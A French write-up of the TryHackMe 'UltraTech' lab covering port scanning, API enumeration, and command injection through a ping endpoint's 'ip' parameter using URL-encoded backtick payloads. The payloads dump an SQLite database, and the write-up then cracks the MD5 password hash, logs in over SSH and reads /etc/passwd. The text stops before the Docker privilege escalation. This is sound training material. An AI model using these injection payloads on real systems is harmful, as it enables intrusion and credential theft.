# TryHackMe - UltraTech Write-up 🇫🇷

## Introduction

Salut à tous !  Voici mon write up de la room "UltraTech" — une room concernant l’exploitation d’un serveur web NodeJS.

Ce compte-rendu couvre l'exploitation complète de la room UltraTech sur TryHackMe, classée comme facile.

Comme d'habitude, tout au long de ce guide, je vais passer en revue les étapes courantes d’un test de pénétration :

- Reconnaissance
- Exploitation
- Post-exploitation

## Informations

- 🛠️ **Type de machine** : Linux
- **🧠 Compétences principales testées** : Exploitation Web via une API REST vulnérable, Énumération locale, Élévation de privilèges via Docker
- **📦 Outils utilisés** : Nmap, Ffuf, Curl, Netcat, Wappalyzer, Pwncat, Docker, JohnTheRipper

Cette machine est une excellente opportunité pour pratiquer les bases du pentest à savoir :

- L'énumération (interne/externe)
- L'énumération/exploitation d’une API REST
- L’élévation de privilèges via Docker

C’est parti !

---

## Préparation

Tout d'abord, nous pouvons ajouter l'adresse IP cible au fichier `/etc/hosts` pour faciliter l'interaction avec la machine cible.

```bash
echo "10.10.79.113 target" | sudo tee -a /etc/hosts
```

Cela nous permet d'accéder à l'adresse IP `10.10.79.113` via le nom suivant : `target`

**Note : Comme indiqué sur l’accueil du repo Github, les adresses IP sont susceptibles de changer entre le début et la fin du write up. Merci de vous concentrer uniquement sur les méthodes d’exploitation !**

## Reconnaissance initiale et observations

Comme d'habitude au début d’une reconnaissance, j'aime bien effectuer un simple scan Nmap agressif à l’aide de l'option `-A`.

Pour ce faire, nous pouvons utiliser la commande suivante :

```bash
nmap -A -oN scan.txt -oX scan.xml target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 22:19 CEST
Nmap scan report for target (10.10.79.113)
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/13%OT=21%CT=1%CU=41488%PV=Y%DS=2%DC=T%G=Y%TM=68C5D20
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%
OS:CI=I%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)SEQ(SP=FB%GC
OS:D=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M50
OS:8NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%
OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   38.68 ms 10.8.0.1
2   38.76 ms target (10.10.79.113)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.97 seconds
```

**Explication de la commande** : Nous commençons un scan Nmap en utilisant le modèle agressif (`-A`), puis nous spécifions d'enregistrer le résultat dans deux fichiers nommés respectivement `scan.xml` et `scan.txt` — un fichier XML en utilisant le flag `-oX` et un fichier texte avec le flag `-oN`.

Mettons tout cela dans un tableau pour faciliter la lecture en utilisant [Nmap2Table](https://github.com/0xMR007/Nmap2Table) et notre fichier XML précédent :

### Host : 10.10.79.113 (target)

| Port/Protocol | State | Service | Version |
| --- | --- | --- | --- |
| 21/tcp | open | ftp | vsftpd 3.0.3 |
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 8081/tcp | open | http | Node.js Express framework |

### NSE Scripts :

```bash
Port 22 :
ssh-hostkey:

  2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
  256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)

Port 8081 :
http-cors:
HEAD GET POST PUT DELETE PATCH

http-title:
Site doesn't have a title (text/html; charset=utf-8).
```

D’après le scan, il n'y a que 3 ports ouverts. Résumons les résultats du scan :

- Port 21 : Le port FTP est ouvert et exécute le service FTP vsftpd 3.0.3 (version à confirmer). Information intéressante à garder sous la main pour plus tard.
- Port 22 : Le port SSH est ouvert et exécute OpenSSH 7.6p1. La machine semble fonctionner sous Ubuntu → On en déduit alors que la machine cible fonctionne sous Linux (confirmé par la détection d’OS).
- Port 8081 : Ce port est assez intriguant étant donné qu’il ne fait pas partie des ports HTTP par défaut. On remarque aussi qu’il semble exécuter le framework Javascript NodeJS, un framework connu dans le développement back-end (côté serveur) d’une application web. → Il faut absolument énumérer ce port plus en profondeur.

### Q1 - Quel logiciel utilise le port 8081 ?

Réponse : `Node.js`

Pour nous assurer de ne rien manquer d'intéressant pendant notre phase d'énumération, nous pouvons effectuer un scan SYN sur tous les ports TCP en utilisant l’option `-p-`.

```bash
nmap -sS --min-rate=1500 -p- target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 22:22 CEST
Nmap scan report for target (10.10.79.113)
Host is up (0.042s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.77 seconds
```

**Note : Ici l’option `--min-rate=1500` permet d’accélerer le scan.**

Bien, il semblerait qu’il y est un 4ème port ouvert sur la machine cible.

### Q2 - Quel autre port non standard est utilisé ?

Réponse : `31331`

Pour avoir plus d’informations sur celui-ci nous pouvons effectuer à nouveau un scan agressif dessus.

```bash
nmap -A -p 31331 target 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 22:24 CEST
Nmap scan report for target (10.10.79.113)
Host is up (0.039s latency).

PORT      STATE SERVICE VERSION
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (98%), Linux 4.4 (97%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (95%), Linux 3.10 - 3.13 (95%), Linux 2.6.32 - 3.10 (95%), Linux 3.10 - 4.11 (94%), Linux 3.8 - 3.16 (93%), Android 9 - 10 (Linux 4.9 - 4.14) (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 31331/tcp)
HOP RTT      ADDRESS
1   39.99 ms 10.8.0.1
2   40.03 ms target (10.10.79.113)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.11 seconds
```

### Q3 - Quel logiciel utilise ce port ?

Réponse : `Apache`

Ce dernier semble lui aussi être un port HTTP fonctionnant sous le service web Apache 2.4.29. De plus, on obtient une nouvelle confirmation concernant l’OS de la machine cible. Cette fois tout de même, il semble correspondre à la page web d’accueil principale de l’application web NodeJS car il contient le titre suivant `UltraTech - The best of technology (AI, FinTech, Big Data)`.

## Énumération Web

Jusqu'à présent, nous avons obtenu les informations suivantes sur la machine cible :

- C’est une machine Linux, plus précisément sous Ubuntu.
- Il s’agit d’un serveur web Apache + NodeJS contenant les services classiques d’un serveur (FTP, SSH)

### Q4 - Quelle distribution GNU/Linux semble être utilisée ?

Réponse : `Ubuntu` 

En utilisant un navigateur et en allant sur `http://target:8081/` puis `http://target:31331/`, la situation s’éclaire.

![1.png](./screenshots/1.png)

Dans un premier temps, sur le port 8081 nous obtenons une page web très minimaliste ne contenant qu’un titre : `UltraTech API v0.1.3` qui nous permet pourtant d’en apprendre plus concernant ce port.

Le port TCP 8081 correspond enfaite au port où se situe l’API de l’application web.

![2.png](./screenshots/2.png)

Ensuite, après m’être rendu sur le port 31331, j’ai finalement compris qu’il s’agissait de la page principale de l’application web de l’entreprise UltraTech.

Maintenant que nous avons une meilleure compréhension de notre environnement web nous devons énumérer plus en profondeur les deux ports concernés.

Tout d'abord, explorons les endpoints disponibles sur l’API REST en utilisant `ffuf` pour une meilleure compréhension du serveur web.

```bash
ffuf -u http://target:8081/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://target:8081/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

auth                    [Status: 200, Size: 39, Words: 8, Lines: 1, Duration: 37ms]
ping                    [Status: 500, Size: 1094, Words: 52, Lines: 11, Duration: 37ms]
:: Progress: [4746/4746] :: Job [1/1] :: 1020 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Notre bruteforce de répertoires web sur l’API nous donne 2 endpoints tout deux intéressants :

- Un endpoint `auth` qui correspond probablement à un endpoint de connexion
- Un endpoint nommé `ping` qui effectue un ping ? Je ne sais pas vraiment mais continuons notre énumération web.

### Q5 - Le logiciel utilisant le port 8081 est une API REST, combien de ses routes sont utilisées par l'application Web ?

Réponse : `2` 

Pour obtenir plus d’informations sur le premier endpoint (`auth`) on peut effectuer une simple requête (GET par défaut) à l’aide de curl.

```bash
curl -v http://target:8081/auth
* Host target:8081 was resolved.
* IPv6: (none)
* IPv4: 10.10.53.117
*   Trying 10.10.53.117:8081...
* Connected to target (10.10.53.117) port 8081
* using HTTP/1.x
> GET /auth HTTP/1.1
> Host: target:8081
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Access-Control-Allow-Origin: *
< Content-Type: text/html; charset=utf-8
< Content-Length: 39
< ETag: W/"27-eyFFXmdQ/Imsneqz2tUSLEVh8vY"
< Date: Sun, 14 Sep 2025 06:21:03 GMT
< Connection: keep-alive
< 
* Connection #0 to host target left intact
You must specify a login and a password%
```

**Note : L’option `-v` active simplement le mode verbose qui consiste à afficher plus d’informations que sans.**

D’après la sortie de la commande précédente, on nous demande de renseigner un identifiant ainsi qu’un mot de passe.

Faisons cela ! Mais avant on peut vérifier quelles méthodes HTTP l’endpoint accepte.

```bash
curl -v -X OPTIONS http://target:8081/auth
* Host target:8081 was resolved.
* IPv6: (none)
* IPv4: 10.10.53.117
*   Trying 10.10.53.117:8081...
* Connected to target (10.10.53.117) port 8081
* using HTTP/1.x
> OPTIONS /auth HTTP/1.1
> Host: target:8081
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 204 No Content
< X-Powered-By: Express
< Access-Control-Allow-Origin: *
< Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
< Vary: Access-Control-Request-Headers
< Content-Length: 0
< Date: Sun, 14 Sep 2025 06:22:32 GMT
< Connection: keep-alive
< 
* Connection #0 to host target left intact
```

Bien, apparemment on peut : lire, ajouter/modifier et supprimer des ressources sur l’endpoint `auth`.

→ C’est très étrange, nous avons les permissions d’un administrateur ? Mmh…ça cache quelque chose à mon avis.

Essayons tout de même de nous connecter en envoyant un corps de requête vide en POST.

```bash
curl -v -X POST -d '{}' http://target:8081/auth                                 
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host target:8081 was resolved.
* IPv6: (none)
* IPv4: 10.10.53.117
*   Trying 10.10.53.117:8081...
* Connected to target (10.10.53.117) port 8081
* using HTTP/1.x
> POST /auth HTTP/1.1
> Host: target:8081
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Length: 2
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 2 bytes
< HTTP/1.1 404 Not Found
< X-Powered-By: Express
< Access-Control-Allow-Origin: *
< Content-Security-Policy: default-src 'self'
< X-Content-Type-Options: nosniff
< Content-Type: text/html; charset=utf-8
< Content-Length: 144
< Date: Sun, 14 Sep 2025 06:24:38 GMT
< Connection: keep-alive
< 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /auth</pre>
</body>
</html>
* Connection #0 to host target left intact
```

L’utilisation de la méthode POST n’est apparemment pas acceptée.

**Note : J’ai passé un peu de temps à essayer d’envoyer des données de connexions sur cet endpoint mais au final c’était une perte de temps :’). L’endpoint `auth` n’était finalement pas si intéressant.**

Passons au second endpoint (`ping`).

```bash
curl -v http://target:8081/ping               
* Host target:8081 was resolved.
* IPv6: (none)
* IPv4: 10.10.53.117
*   Trying 10.10.53.117:8081...
* Connected to target (10.10.53.117) port 8081
* using HTTP/1.x
> GET /ping HTTP/1.1
> Host: target:8081
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 500 Internal Server Error
< X-Powered-By: Express
< Access-Control-Allow-Origin: *
< Content-Security-Policy: default-src 'self'
< X-Content-Type-Options: nosniff
< Content-Type: text/html; charset=utf-8
< Content-Length: 1094
< Date: Sun, 14 Sep 2025 06:56:52 GMT
< Connection: keep-alive
< 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError: Cannot read property &#39;replace&#39; of undefined<br> &nbsp; &nbsp;at app.get (/home/www/api/index.js:45:29)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/www/api/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)<br> &nbsp; &nbsp;at /home/www/api/node_modules/cors/lib/index.js:224:17</pre>
</body>
</html>
* Connection #0 to host target left intact
```

Intéressant ! Nous avons enfin obtenu une réponse du serveur qui est une erreur serveur (code d’erreur HTTP 500) donc probablement une erreur côté NodeJS d’après la sortie.

Pour mieux visualiser l’erreur la voici dans un bloc à part :

```jsx
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

L’erreur ci-dessus est une erreur Javascript signifie simplement que le paramètre d’une certaine fonction `replace` (qui permet certainement de remplacer un caractère dans une chaine de caractères) est de type `undefined`. Autrement dit, on a ceci :

```jsx
replace(undefined) -> Erreur

// Utilisation correcte de la fonction replace
let text = "Jetez un oeil à mon profil Github!";
let result = text.replace("Github", "LinkedIn"); // Remplace Github par LinkedIn
console.log(result) // Résultat : Jetez un oeil à mon profil LinkedIn!
```

On comprend alors qu’un paramètre URL est attendu pour ensuite être passé dans la fonction `replace`. Comme je n’ai pas mis de paramètre URL, il n’était alors pas défini (`undefined`) ce qui a provoqué l’erreur.

Essayons d’ajouter un paramètre `host` dans notre précédente requête.

```bash
curl -i "http://target:8081/ping?host=127.0.0.1"
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1094
Date: Sun, 14 Sep 2025 06:57:51 GMT
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError: Cannot read property &#39;replace&#39; of undefined<br> &nbsp; &nbsp;at app.get (/home/www/api/index.js:45:29)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/www/api/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)<br> &nbsp; &nbsp;at /home/www/api/node_modules/cors/lib/index.js:224:17</pre>
</body>
</html>
```

Nous obtenons alors la même erreur. Essayons une dernière fois avec un autre paramètre `ip`.

```bash
curl -i "http://target:8081/ping?ip=127.0.0.1"
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 251
ETag: W/"fb-qdpnOOBCurtZWSOU7HR/WvtJjOw"
Date: Sun, 14 Sep 2025 06:56:26 GMT
Connection: keep-alive

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
```

Parfait ! Nous avons donc trouvé le paramètre correspondant.

On comprend aussi la fonction de l’endpoint `ping` qui permet enfaite d’effectuer un ping du serveur web vers une adresse IP donnée.

## Exploitation

Ce genre d’endpoint peuvent être vulnérables aux injections de commandes.

Essayons d’en effectuer une !

```bash
curl -i "http://target:8081/ping?ip=127.0.0.1%60id%60"
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 61
ETag: W/"3d-2J2mX1i3I4uQhsVi8ABaq24IgPw"
Date: Sun, 14 Sep 2025 09:56:26 GMT
Connection: keep-alive

ping: groups=1002(www): Temporary failure in name resolution
```

Et voilà ! Nous avons réussi à exploiter une vulnérabilité de type injection de commandes !

À noter que j’ai dû encoder l’URL  à l’aide de Cyberchef ([CyberChef](https://gchq.github.io/CyberChef/)) en encodage URL afin qu’il n’y est pas d’erreur de syntaxe.

Jetons un oeil aux fichiers présents :

```bash
curl.exe -i "http://target:8081/ping?ip=127.0.0.1%60ls%60"
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 49
ETag: W/"31-HlSQypQjJ8bvYzsasjt4yTZkt90"
Date: Sun, 14 Sep 2025 17:57:06 GMT
Connection: keep-alive

ping: utech.db.sqlite: Name or service not known
```

### Q6 - Il y a une base de données qui traîne, quel est son nom de fichier ?

Réponse : `utech.db.sqlite`

Nous avons donc trouvé un fichier de base de données SQLite nommé : `utech.db.sqlite`.

Étant donné que nous utilisons des commandes simples via l’injection de commandes, nous ne pouvons pas ouvrir proprement la base de données.

Nous pouvons tout de même utiliser la commande `cat` afin d’afficher le contenu de celui-ci.

```bash
curl -i "http://target:8081/ping?ip=127.0.0.1%3Becho%20vuln_backtick%60cat%20utech.db.sqlite%60"
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 147
ETag: W/"93-594eIY8lmtfDeu2ln6BdpbW24SI"
Date: Sun, 14 Sep 2025 10:28:11 GMT
Connection: keep-alive

���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
```

On obtient finalement le hash suivant qui semble être du MD5 (ou en tout cas de la famille des MD) 

`f357a0c52799563c7c7b76c1e7543a32`

### Q7 - Quel est le hash du mot de passe du premier utilisateur ?

Réponse : `f357a0c52799563c7c7b76c1e7543a32`

Bien, nous avons donc trouvé un hash sûrement d’un mot de passe de l’utilisateur `r00t` étant donné que nous l’avons trouvé dans une base donnée et qu’il était associé à ce nom d’utilisateur.

Maintenant que nous disposons de ce hash nous pouvons tenter de le cracker à l’aide de différents outils tels que Hashcat, JohnTheRipper ou encore Crackstation (outil en ligne).

Par pure impression, j’ai précédemment dis que le hash semblait être un hash MD5 (caractères utilisés, longueur). J’ai alors essayer dans un premier temps, de cracker le hash à l’aide de John et en spécifiant l’option  `--format=Raw-MD5`.

```bash
echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5                 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
n100906          (?)     
1g 0:00:00:00 DONE (2025-09-14 12:31) 4.347g/s 22801Kp/s 22801Kc/s 22801KC/s n102983..n0valyf
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Mon impression était bonne (c’est surtout que les hash MD5 sont très courants dans ces challenges mais bon 🫠) → John a réussi a cracker le hash `f357a0c52799563c7c7b76c1e7543a32` qui correspond au mot `n100906` en MD5.

### Q8 - Quel est le mot de passe associé à ce hash ?

Réponse : `n100906`

Si ce n’était pas le bon algorithme de hachage, il aurait fallu utiliser des outils en ligne comme Crackstation (précédemment cité) ou encore Hashes.com afin de déterminer l’algorithme de hachage utilisé. En effet, les outils en ligne dispose de bien plus de données qu’une simple wordlist.

Par exemple avec Crackstation, on retrouve le même résultat :

![3.png](./screenshots/3.png)

Ceci étant dit, nous avons trouvé le mot de passe de l’utilisateur `r00t` (et non `root` dommage :’)).

## Post-exploitation

Nous pouvons donc tenter de nous connecter par SSH à la machine cible sous le nom de `r00t` avec la commande ci-dessous.

```bash
ssh r00t@target                                                           
The authenticity of host 'target (10.10.216.19)' can't be established.
ED25519 key fingerprint is SHA256:g5I2Aq/2um35QmYfRxNGnjl3zf9FNXKPpEHxMLlWXMU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
r00t@target's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 14 10:32:43 UTC 2025

  System load:  0.01               Processes:           105
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 35%                IP address for ens5: 10.10.216.19
  Swap usage:   0%

1 package can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$
```

Nous voilà désormais connecté sur la machine cible !

Désormais, le but est d’obtenir le plus d’informations possible sur la machine cible ainsi que sur notre utilisateur (OS, versions de services, fichiers SUID, privilèges, etc…).

Jusqu’ici nous avons les informations suivantes sur la machine cible :

- OS : Ubuntu 18.04.2 LTS
- Version du kernel Linux : 4.15.0
- Type de machine : Serveur web NodeJS + Apache2
- Un utilisateur nommé `r00t` (probablement sans privilèges) est disponible

Exécutons quelques commandes afin de commencer notre énumération locale.

```bash
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:~$ ls -la
total 28
drwxr-xr-x 4 r00t r00t 4096 Sep 14 10:32 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Sep 14 10:32 .cache
drwx------ 3 r00t r00t 4096 Sep 14 10:32 .gnupg
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile

r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.

r00t@ultratech-prod:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh
```

**Explication des commandes :**

- `id` : Permet de récupérer des informations sur l’utilisateur (groupes auxquels il appartient, privilèges)
- `sudo -l` : Permet de vérifier si l’utilisateur dispose de privilèges **sudo** (administrateur).
- `cat /etc/passwd` : Liste le contenu du fichier `passwd` contenant une liste des utilisateurs présents sur le système.

D’après les résultats obtenus, on peut relever les informations suivantes : 

- Il semblerait que l’utilisateur fasse partie du groupe `docker` qui correspond enfaite au groupe associé au service **Docker** ([What is Docker Documentation officielle](https://docs.docker.com/get-started/docker-overview/)).
    
    **Note : Je n’y ai pas assez prêté attention au début mais cette information est cruciale pour la fin de la room.**
    
